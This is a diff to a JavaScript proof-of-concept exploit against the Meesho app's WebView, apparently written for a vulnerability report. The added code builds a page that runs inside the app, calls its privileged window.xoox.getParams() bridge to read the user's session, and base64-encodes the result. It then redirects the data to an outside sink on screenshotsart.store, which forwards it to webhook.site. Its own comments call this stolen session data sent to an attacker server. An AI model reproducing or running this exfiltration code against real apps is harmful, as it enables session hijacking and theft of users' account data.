@@ -73,30 +73,34 @@ async function sha256(s){
   var got = await sha256(params.k);
   if (got !== KEY_HASH) return;
 
-  // Webhook for this PoC instance.
-  var webhookId = params.w || "REPLACE-WEBHOOK-UUID";
-  var WEBHOOK = "https://webhook.site/" + webhookId;
+  // Webhook UUID this PoC forwards to (set via &w= in the activation URL).
+  var webhookId = params.w || "";
 
-  // Inline exfil page that runs INSIDE Meesho's WebView once the deeplink
-  // opens it. xoox bridge is registered by WebViewActivity (with_oauth=true)
-  // before this URL is loaded, so window.xoox is present here.
+  // Exfil sink hosted on screenshotsart.store. The data: URI script (below)
+  // calls window.xoox.getParams() inside Meesho's WebView, then redirects
+  // the WebView to this page. The exfil page decodes/displays the stolen
+  // session on screen (visual proof on camera) and forwards the raw payload
+  // to webhook.site for the durable report record.
+  var EXFIL_SINK = "https://screenshotsart.store/meesho-exfil.html";
+
+  // Inline page that runs INSIDE Meesho's WebView once the deeplink opens
+  // it. The xoox bridge is registered by WebViewActivity (with_oauth=true)
+  // BEFORE the URL is loaded, so window.xoox is present here.
   var EXFIL_HTML =
     "<!doctype html><html><head><meta charset=utf-8>" +
-    "<title>...</title>" +
-    "<style>body{font-family:monospace;background:#000;color:#0f0;padding:12px;font-size:11px;word-break:break-all}h2{color:#e94560}</style>" +
+    "<title>Reading session</title>" +
+    "<style>body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a14;color:#e0e0e0;padding:24px;text-align:center}h2{color:#f43397}</style>" +
     "</head><body>" +
-    "<h2>xoox bridge accessible from attacker origin</h2>" +
-    "<pre id=o>...</pre>" +
+    "<h2>Reading session…</h2>" +
+    "<p>Forwarding to attacker server.</p>" +
     "<script>" +
-    "var W=" + JSON.stringify(WEBHOOK) + ";" +
+    "var SINK=" + JSON.stringify(EXFIL_SINK) + ";" +
+    "var WID=" + JSON.stringify(webhookId) + ";" +
     "var r=null;" +
     "try{r=window.xoox.getParams()}catch(e){r='ERR:'+e.message}" +
-    "document.title=(r||'').substring(0,80);" +
-    "document.getElementById('o').textContent=r;" +
-    "var x=new XMLHttpRequest();" +
-    "x.open('POST',W,true);" +
-    "x.setRequestHeader('Content-Type','text/plain');" +
-    "x.send(r);" +
+    "function b64(s){return btoa(unescape(encodeURIComponent(s)))}" +
+    "var url=SINK+'#d='+encodeURIComponent(b64(r||''))+'&w='+encodeURIComponent(WID);" +
+    "location.href=url;" +
     "<\/script></body></html>";
 
   function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
